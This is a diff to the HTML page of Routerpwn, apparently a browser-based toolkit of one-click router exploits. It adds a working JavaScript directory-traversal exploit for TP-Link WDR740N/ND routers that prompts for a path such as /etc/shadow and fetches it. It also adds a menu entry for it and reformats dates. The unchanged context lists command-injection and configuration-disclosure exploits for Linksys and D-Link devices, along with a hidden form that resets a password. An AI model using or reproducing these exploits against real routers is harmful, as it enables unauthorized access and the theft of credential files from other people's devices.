@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.197</title>
+		<title>Routerpwn 1.13.198</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -569,6 +569,16 @@ function wrtadmin() {
 	if (ip==null || ip==""){}else{
 		document.wrtadmin.submit();
 	}
+
+// TP-Link WDR740ND/WDR740N - Directory Traversal
+function wdr740_dirtraversal(ip)
+{
+
+	ip = ip || "192.168.1.254";
+	path = prompt("Path: (ex: /etc/shadow)");
+	document.location = "http://" + ip + "/help/../../../../../../../../../../../../../../../.." + path;
+}
+
 }
 function wrtadminr() {
 	ip=prompt("IP:");
@@ -2332,18 +2342,20 @@ a=a+1
 </article>
 
 <article>
-	<div>23/09/13</div>
+	<div>09/23/13</div>
 	<div><a href="http://www.exploit-db.com/exploits/28484/">[+]</a></div>
 	<div><a href="javascript:wrt110_command()">Linksys WRT110 Remote Command Execution</a></div>
 	<div><a href="javascript:wrt110_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
-	<div>21/05/13</div>
+	
+<article>	
+	<div>05/21/13</div>
 	<div><a href="http://www.s3cur1ty.de/m1adv2013-012">[+]</a></div>
 	<div><a href="javascript:wrt160nv2_command()">Linksys WRT160nv2 - apply.cgi Remote Command Injection</a></div>
 	<div><a href="javascript:wrt160nv2_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 <article>
-	<div>22/06/13</div>
+	<div>06/22/13</div>
 	<div><a href="http://www.s3cur1ty.de/m1adv2013-019">[+]</a></div>
 	<div><a href="javascript:x3000_command()">Linksys X3000 - OS Command Inyection</a></div>
 	<div><a href="javascript:x3000_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
@@ -2491,7 +2503,7 @@ a=a+1
 <h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325, <a href="javascript:img('DSL-2750U')">DSL-2750U, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a></h3>
 
 <article>
-	<div>15/01/14</div>
+	<div>01/15/14</div>
 	<div><a href="http://1337day.com/exploit/8713">[+]</a></div>
 	<div><a href="javascript:dwl2100ap_configdisclosure()">DWL-2100AP - Configuration Disclosure</a></div>
 	<div><a href="javascript:dwl2100ap_configdisclosure(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
@@ -3545,10 +3557,18 @@ a=a+1
 <input name="uiViewTools_Password" value="123123" type="hidden">
 <input name="uiViewTools_PasswordConfirm" value="123123" type="hidden"></form>
 <h2>TP-LINK</h2>
-<h3><a href="javascript:img('TD-8817')">TD-8817</a>, <a href="javascript:img('TD-W8901G')">TD-W8901G</a>, <a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WR743ND')">WR743ND</a>, <a href="javascript:img('WR842ND')">WR842ND</a>, <a href="javascript:img('WA-901ND')">WA-901ND</a>, <a href="javascript:img('WR941N')">WR941N</a>, <a href="javascript:img('WR941ND')">WR941ND</a>, <a href="javascript:img('WR1043ND')">WR1043ND</a>, <a href="javascript:img('WR2543ND')">WR2543ND</a>, <a href="javascript:img('MR3220')">MR3220</a>, <a href="javascript:img('MR3020')">MR3020</a>, <a href="javascript:img('WR841N ')">WR841N</a>, <a href="javascript:img('TD-8840T')">TD-8840T</a></h3>
+<h3><a href="javascript:img('TD-8817')">TD-8817</a>, <a href="javascript:img('TD-W8901G')">TD-W8901G</a>, <a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WR743ND')">WR743ND</a>, <a href="javascript:img('WR842ND')">WR842ND</a>, <a href="javascript:img('WA-901ND')">WA-901ND</a>, <a href="javascript:img('WR941N')">WR941N</a>, <a href="javascript:img('WR941ND')">WR941ND</a>, <a href="javascript:img('WR1043ND')">WR1043ND</a>, <a href="javascript:img('WR2543ND')">WR2543ND</a>, <a href="javascript:img('MR3220')">MR3220</a>, <a href="javascript:img('MR3020')">MR3020</a>, <a href="javascript:img('WR841N ')">WR841N</a>, <a href="javascript:img('TD-8840T')">TD-8840T</a> , <a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WDR740N')">WDR740D</a></h3>
 
 <article>
-	<div>14/01/14</div>
+	<div>05/26/12</div>
+	<div><a href="http://www.websec.mx/advisories/view/tplink-wdr740-path-traversal">[+]</a></div>
+	<div><a href="javascript:wdr740_dirtraversal()">TP-Link WDR740ND/WDR740N - Directory Traversal</a></div>
+	<div><a href="javascript:wdr740_dirtraversal(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+
+<article>
+	<div>01/14/14</div>
 	<div><a href="http://1337day.com/exploit/21601">[+]</a></div>
 	<div><a href="javascript:td8840t_resetauth()">TD-8840T - Reset Password to Blank</a></div>
 	<div><a href="javascript:td8840t_resetauth(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
